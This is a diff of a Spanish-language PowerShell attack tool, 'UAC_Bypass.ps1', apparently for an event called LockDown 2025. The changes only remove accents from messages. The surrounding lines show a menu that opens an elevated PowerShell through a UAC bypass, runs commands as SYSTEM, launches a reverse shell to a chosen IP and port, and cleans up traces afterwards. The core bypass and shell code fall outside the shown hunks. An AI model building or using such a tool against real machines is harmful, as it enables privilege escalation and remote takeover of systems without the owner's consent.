@@ -1,5 +1,7 @@
 # UAC_Bypass.ps1
-# Versión para LockDown 2025 
+# Version para LockDown 2025 
+
+# Fix para caracteres especiales
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $OutputEncoding = [System.Text.Encoding]::UTF8
 
@@ -118,7 +120,7 @@ public class Win32
         }
         
         if (-not $windowFound) {
-            Write-Host "[-] No se pudo encontrar la ventana después de 10 intentos" -ForegroundColor Red
+            Write-Host "[-] No se pudo encontrar la ventana despues de 10 intentos" -ForegroundColor Red
             return $false
         }
         
@@ -178,7 +180,7 @@ Function Execute-Command($CommandToExecute) {
                     Write-Host ("=" * 50) -ForegroundColor Cyan
                     
                     if ([string]::IsNullOrWhiteSpace($outputContent)) {
-                        Write-Host "(El comando se ejecutó sin output visible)" -ForegroundColor Gray
+                        Write-Host "(El comando se ejecuto sin output visible)" -ForegroundColor Gray
                     } else {
                         Write-Host $outputContent.Trim()
                     }
@@ -189,11 +191,11 @@ Function Execute-Command($CommandToExecute) {
                     Write-Host "[-] Error leyendo el archivo de output: $_" -ForegroundColor Red
                 }
             } else {
-                Write-Host "[-] No se generó archivo de output" -ForegroundColor Yellow
-                Write-Host "[!] El comando puede estar ejecutándose en segundo plano" -ForegroundColor Yellow
+                Write-Host "[-] No se genero archivo de output" -ForegroundColor Yellow
+                Write-Host "[!] El comando puede estar ejecutandose en segundo plano" -ForegroundColor Yellow
             }
         } else {
-            Write-Host "[-] El bypass de UAC falló" -ForegroundColor Red
+            Write-Host "[-] El bypass de UAC fallo" -ForegroundColor Red
         }
         
         return $result
@@ -271,10 +273,10 @@ exit /b 0
                 }
                 Write-Host ("=" * 50) -ForegroundColor Cyan
             } else {
-                Write-Host "[!] Comando ejecutado, pero no se generó output" -ForegroundColor Yellow
+                Write-Host "[!] Comando ejecutado, pero no se genero output" -ForegroundColor Yellow
             }
         } else {
-            Write-Host "[-] Error en la ejecución" -ForegroundColor Red
+            Write-Host "[-] Error en la ejecucion" -ForegroundColor Red
         }
         
         return $result
@@ -346,14 +348,14 @@ try {
         Write-Host "[!] Verifica tu listener en $($IP):$($Port)" -ForegroundColor Yellow
         Write-Host "[!] La reverse shell se ejecuta en segundo plano" -ForegroundColor Yellow
     } else {
-        Write-Host "[-] Falló la ejecución de la reverse shell" -ForegroundColor Red
+        Write-Host "[-] Fallo la ejecucion de la reverse shell" -ForegroundColor Red
     }
     
     return $result
 }
 
 Function Invoke-ReverseShellMenu {
-    Write-Host "[+] Configuración de Reverse Shell" -ForegroundColor Cyan
+    Write-Host "[+] Configuracion de Reverse Shell" -ForegroundColor Cyan
     $ip = Read-Host "Ingresa la IP"
     $port = Read-Host "Ingresa el Puerto"
     
@@ -369,7 +371,7 @@ Function Invoke-ReverseShellMenu {
         Write-Host "[+] PowerShell Reverse Shell ejecutada exitosamente" -ForegroundColor Green
         Write-Host "[!] Verifica tu listener en $($ip):$($port)" -ForegroundColor Yellow
     } else {
-        Write-Host "[-] Falló la ejecución de la reverse shell" -ForegroundColor Red
+        Write-Host "[-] Fallo la ejecucion de la reverse shell" -ForegroundColor Red
     }
     
     return $result
@@ -433,7 +435,7 @@ Function Invoke-Cleanup {
         }
     }
     catch {
-        Write-Host "[-] Error con método PowerShell" -ForegroundColor Yellow
+        Write-Host "[-] Error con metodo PowerShell" -ForegroundColor Yellow
     }
     
     try {
@@ -473,7 +475,7 @@ Function Show-MainMenu {
     }
 
     Write-Host ""
-    Write-Host "Selecciona una opción:" -ForegroundColor White
+    Write-Host "Selecciona una opcion:" -ForegroundColor White
     Write-Host "1. Abrir PowerShell elevado" -ForegroundColor Gray
     Write-Host "2. Ejecutar comando" -ForegroundColor Gray
     Write-Host "3. Ejecutar comando como SYSTEM" -ForegroundColor Cyan
@@ -486,16 +488,16 @@ Function Show-MainMenu {
 
 do {
     Show-MainMenu
-    $opcion = Read-Host "Opción"
+    $opcion = Read-Host "Opcion"
 
     switch ($opcion) {
         "1" { 
-            Write-Host "[+] Abriendo PowerShell con elevación..." -ForegroundColor Yellow
+            Write-Host "[+] Abriendo PowerShell con elevacion..." -ForegroundColor Yellow
             $result = Execute-UACBypass "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
             if ($result) {
-                Write-Host "[+] PowerShell ejecutado con elevación" -ForegroundColor Green
+                Write-Host "[+] PowerShell ejecutado con elevacion" -ForegroundColor Green
             } else {
-                Write-Host "[-] Falló el bypass para PowerShell" -ForegroundColor Red
+                Write-Host "[-] Fallo el bypass para PowerShell" -ForegroundColor Red
             }
             Write-Host ""
             Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
@@ -544,7 +546,7 @@ do {
             exit
         }
         default {
-            Write-Host "[-] Opción no válida" -ForegroundColor Red
+            Write-Host "[-] Opcion no valida" -ForegroundColor Red
             Write-Host ""
             Write-Host "Presiona Enter para continuar..." -ForegroundColor Gray -NoNewline
             $null = Read-Host
